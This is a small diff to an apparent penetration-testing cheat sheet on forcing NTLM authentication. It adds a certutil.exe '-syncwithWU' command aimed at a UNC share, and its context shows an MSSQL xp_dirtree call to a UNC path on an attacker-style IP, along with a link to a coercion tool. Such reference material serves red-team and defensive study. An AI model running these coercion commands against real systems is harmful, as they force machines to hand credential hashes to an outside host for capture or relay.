@@ -93,6 +93,14 @@ EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 
 Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
+### Certutil
+
+It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:
+
+```bash
+certutil.exe -syncwithWU  \\127.0.0.1\share
+```
+
 ## HTML injection
 
 ### Via email
